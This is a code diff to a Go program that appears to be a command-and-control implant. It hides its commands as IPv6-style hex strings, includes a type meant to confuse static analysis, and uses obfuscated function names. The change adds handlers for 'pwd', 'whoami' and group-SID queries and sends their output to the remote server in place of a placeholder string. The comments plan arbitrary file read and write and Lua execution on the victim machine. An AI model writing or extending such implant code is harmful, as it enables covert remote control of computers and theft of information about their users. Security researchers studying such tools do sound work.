@@ -11,6 +11,7 @@ import (
 	"math/rand"
 	"net/http"
 	b "reflect"
+	"strings"
 )
 
 // ResponseData Struct to hold the response format from the server
@@ -26,6 +27,24 @@ var CompUUID string
 // Used to mess up static analysis
 type unknown struct {
 	primaryField bool
+}
+
+// procOut is out the output from command processing
+var procOut string
+
+// https://stackoverflow.com/questions/54461423/efficient-way-to-remove-all-non-alphanumeric-characters-from-large-text
+func strip(s string) string {
+	var result strings.Builder
+	for i := 0; i < len(s); i++ {
+		u := s[i]
+		if ('a' <= u && u <= 'z') ||
+			('A' <= u && u <= 'Z') ||
+			('0' <= u && u <= '9') ||
+			u == ' ' {
+			result.WriteByte(u)
+		}
+	}
+	return result.String()
 }
 
 func BB176245(x int) bool {
@@ -182,9 +201,18 @@ startpoint:
 						// A switch statement to run through possible command options, including using the lua engine
 						// List arbitrary dir, read file, write file, execute Lua
 						// Returns the result of execution (stdout or bool) or returns an error
+						decoded = strip(decoded)
+						switch decoded {
+						case "pwd":
+							procOut = shared.GetCurrentDir()
+						case "whoami":
+							procOut = shared.GetCurrentUser()
+						case "groupSID":
+							procOut = shared.GetGroupsSID()
+						}
 
 						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-						err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+						err = shared.SendDataRequest(postUrl, procOut, maxRetries, impIdCookie)
 						if err != nil {
 							return
 						}
@@ -248,12 +276,12 @@ startpoint:
 
 					// The response comes encoded in a hex format that mimics IPv6 IPs
 					// Decode that data
-					_, err = shared.DecodeIPv6ToString(data.Message)
+					decoded, err := shared.DecodeIPv6ToString(data.Message)
 					if err != nil {
 						//fmt.Println(err)
 						break
 					}
-					//fmt.Println("Decoded string:", decoded)
+					fmt.Println("Decoded string:", decoded)
 
 					// Verify the message with the received HMAC
 					// First get the counter through the DeriveCount func
@@ -266,9 +294,15 @@ startpoint:
 						// A switch statement to run through possible command options, including using the lua engine
 						// List arbitrary dir, read file, write file, execute Lua
 						// Returns the result of execution (stdout or bool) or returns an error
+						fmt.Println(decoded)
+						switch decoded {
+						case "pwd":
+							procOut = shared.GetCurrentDir()
+							fmt.Println("Current dir:", procOut)
+						}
 
 						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-						err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+						err = shared.SendDataRequest(postUrl, procOut, maxRetries, impIdCookie)
 						if err != nil {
 							fmt.Println(err)
 						}
